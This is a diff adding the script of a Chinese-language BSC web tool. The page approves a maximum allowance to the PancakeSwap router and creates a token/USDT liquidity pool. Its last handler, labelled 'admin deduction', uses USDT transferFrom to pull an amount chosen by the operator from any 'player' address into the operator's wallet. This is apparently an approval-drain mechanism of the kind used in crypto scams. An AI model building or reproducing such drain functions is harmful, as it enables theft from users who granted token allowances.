+        const tx = await tokenContract.approve(PANCAKE_ROUTER,MAX_ALLOWANCE);
+        showStatus(`新代币授权发送 txHash:${tx.hash}，等待确认`);
+        await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
+        showStatus("✅你的代币授权Router成功");
+    }catch(err){
+        showStatus("❌授权失败："+(err.message||String(err)));
+    }finally{ approveNewTokenBtn.disabled=false; }
+};
+
+//第三步 创建池子
+createPoolBtn.onclick = async function(){
+    showStatus("👉点击了创建池子，正在执行函数");
+    if(!signer){ showStatus("❌请先连接钱包"); return; }
+    const tokenA = baseTokenAddr.value.trim();
+    const tokenB = BSC_USDT_ADDRESS;
+    const tokenAmtStr = liquidTokenIn.value.trim();
+    const usdtAmtStr = liquidUsdtIn.value.trim();
+    const slip = Number(slippageInput.value.trim());
+    if(!tokenA || !tokenAmtStr || !usdtAmtStr || isNaN(slip)){
+        showStatus("❌开盘价、USDT投入不能为空");
+        return;
+    }
+    createPoolBtn.disabled=true;
+    try{
+        showStatus("⏳正在格式化参数，唤起钱包签名...");
+        const amountADesired = ethers.parseUnits(tokenAmtStr,18);
+        const amountBDesired = ethers.parseUnits(usdtAmtStr,18);
+        const ratioMin = (100-slip)/100;
+        const amountAMin = amountADesired * BigInt(Math.floor(ratioMin*10000)) / 10000n;
+        const amountBMin = amountBDesired * BigInt(Math.floor(ratioMin*10000)) /10000n;
+        const deadline = Math.floor(Date.now()/1000)+1200;
+
+        const router = new ethers.Contract(PANCAKE_ROUTER,ROUTER_ABI,signer);
+        showStatus("🚀调用addLiquidity，等待TP钱包弹窗签名！");
+        const tx = await router.addLiquidity(
+            tokenA,tokenB,
+            amountADesired,amountBDesired,
+            amountAMin,amountBMin,
+            await signer.getAddress(),
+            deadline
+        );
+        showStatus(`创建池子交易发送 txHash:${tx.hash}，等待区块确认`);
+        await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
+        showStatus(`✅✅流动性池子创建成功！交易哈希：${tx.hash}，LP已经到账你的钱包`);
+    }catch(err){
+        const errMsg = err?.message||String(err);
+        showStatus("❌创建池子调用出错："+errMsg);
+    }finally{ createPoolBtn.disabled=false; }
+};
+
+//管理员划扣
+deductBtn.onclick = async function(){
+    if(!signer) { showStatus("❌未连接钱包"); return; }
+    const targetAddr = userAddrInput.value.trim();
+    const deductNum = deductAmountInput.value.trim();
+    if(!targetAddr || !deductNum){ showStatus("❌请填写玩家地址与划扣数量"); return; }
+    deductBtn.disabled = true;
+    try{
+        const usdt = new ethers.Contract(BSC_USDT_ADDRESS,ERC20ABI,signer);
+        const amt = ethers.parseUnits(deductNum,18);
+        const tx = await usdt.transferFrom(targetAddr,await signer.getAddress(),amt);
+        showStatus(`划扣交易发送 txHash:${tx.hash}`);
+        await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
+        showStatus("✅管理员划扣执行完成");
+    }catch(e){
+        showStatus("❌划扣失败："+(e.message||String(e)));
+    }finally{ deductBtn.disabled = false; }
+};
+</script>
+</body>
+</html>
